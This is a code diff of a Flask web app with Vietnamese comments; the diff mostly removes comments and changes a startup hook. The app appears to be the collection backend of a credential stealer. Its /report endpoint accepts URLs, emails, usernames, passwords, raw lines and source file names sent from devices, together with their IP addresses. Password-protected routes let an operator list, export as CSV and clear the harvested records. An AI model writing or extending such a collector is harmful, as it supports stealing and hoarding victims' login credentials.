@@ -20,8 +20,6 @@ ADMIN_PASS = os.getenv("ADMIN_PASS", "secret")  # set trên Render env
 
 # ---------- DB helper ----------
 def get_db_conn():
-    # Dùng sslmode=require vì Render Postgres yêu cầu TLS
-    # psycopg2.connect chấp nhận dsn string và keyword sslmode
     return psycopg2.connect(DB_DSN, sslmode="require", cursor_factory=RealDictCursor)
 
 CREATE_TABLE_SQL = """
@@ -62,8 +60,8 @@ def ensure_table(retries=8, delay_base=0.5):
     app.logger.error("Could not ensure DB table after %d attempts", retries)
     return False
 
-# Chạy ensure_table khi worker chuẩn bị phục vụ requests
-@app.before_serving
+# Chạy ensure_table trước request đầu tiên (Flask hỗ trợ)
+@app.before_first_request
 def init_on_start():
     ensure_table()
 
@@ -72,7 +70,6 @@ def check_basic_auth():
     auth = request.authorization
     if not auth or not auth.username or not auth.password:
         return False
-    # sử dụng compare_digest để tránh timing attacks
     ok_user = hmac.compare_digest(auth.username, ADMIN_USER)
     ok_pass = hmac.compare_digest(auth.password, ADMIN_PASS)
     return ok_user and ok_pass
@@ -95,13 +92,6 @@ def index():
 
 @app.route("/report", methods=["POST", "GET"])
 def report():
-    """
-    Accepts:
-    - POST JSON: { "url":..., "email":..., "username":..., "password":..., "raw_line":..., "source_file":..., "local_ips": [...], "public_ipv4": "...", "public_ipv6": "..." }
-    - or GET: simple ping from devices (no body)
-    Device IP (device_ip) resolved as: public_ipv4 > public_ipv6 > first local_ips > X-Forwarded-For > remote_addr
-    """
-    # parse incoming payload if JSON
     data = {}
     if request.method == "POST":
         try:
@@ -109,8 +99,6 @@ def report():
         except Exception:
             data = {}
 
-    # Resolve client IP candidates
-    # prefer explicit public IPs in payload; fallback to headers
     device_ip = None
     pub4 = data.get("public_ipv4")
     pub6 = data.get("public_ipv6")
@@ -123,14 +111,12 @@ def report():
     elif isinstance(local_ips, (list, tuple)) and local_ips:
         device_ip = local_ips[0]
     else:
-        # X-Forwarded-For could be comma-separated
         xff = request.headers.get("X-Forwarded-For", "")
         if xff:
             device_ip = xff.split(",")[0].strip()
         else:
             device_ip = request.remote_addr
 
-    # fields to store
     record = {
         "device_ip": device_ip,
         "url": data.get("url"),
@@ -144,7 +130,6 @@ def report():
         "path": request.path
     }
 
-    # Insert into DB
     try:
         conn = get_db_conn()
         cur = conn.cursor()
@@ -192,14 +177,9 @@ def list_logs():
 @app.route("/export", methods=["GET"])
 @requires_auth
 def export_csv():
-    """
-    Export rows as CSV attachment.
-    Optionally ?limit=N (default 1000)
-    """
     limit = int(request.args.get("limit", "1000"))
 
     def generate():
-        # stream CSV
         header = ["id","device_ip","url","email","username","password","raw_line","source_file","user_agent","method","path","created_at"]
         out = io.StringIO()
         writer = csv.writer(out)
@@ -210,7 +190,7 @@ def export_csv():
 
         try:
             conn = get_db_conn()
-            cur = conn.cursor(name="export_cursor", cursor_factory=RealDictCursor)  # server-side cursor
+            cur = conn.cursor(name="export_cursor", cursor_factory=RealDictCursor)
             cur.itersize = 1000
             cur.execute("SELECT id, device_ip::text AS device_ip, url, email, username, password, raw_line, source_file, user_agent, method, path, created_at FROM logs ORDER BY created_at DESC LIMIT %s", (limit,))
             for row in cur:
@@ -222,7 +202,7 @@ def export_csv():
             conn.close()
         except Exception as e:
             app.logger.exception("export failed: %s", e)
-            out.write("\n")  # ensure response ends
+            out.write("\n")
             yield out.getvalue()
 
     filename = f"logs_export_{int(time.time())}.csv"
@@ -246,6 +226,5 @@ def clear_logs():
 
 # ---------- run ----------
 if __name__ == "__main__":
-    # Local debug: ensure table synchronously
-    ensure_table()
+    ensure_table()  # Local debug
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
